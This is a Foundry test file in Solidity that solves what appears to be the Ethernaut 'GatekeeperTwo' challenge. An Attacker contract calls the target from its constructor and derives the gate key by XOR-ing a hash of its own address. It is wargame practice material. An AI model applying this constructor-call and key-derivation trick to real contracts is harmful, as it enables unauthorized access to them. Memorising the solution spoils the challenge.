// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "~/GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new GatekeeperTwo();
    }

    function attack() private {
        new Attacker(target);
    }

    function testAttack() public {
        vm.startPrank(player, player); // tx.origin is pranked as well
        attack();
        vm.stopPrank();

        assertEq(target.entrant(), player, "player must be the entrant");
    }
}

contract Attacker {
    address owner;

    constructor(GatekeeperTwo target) {
        // gets past the third gate, the hash of address will be canceled due to XOR
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        target.enter(key);
    }
}
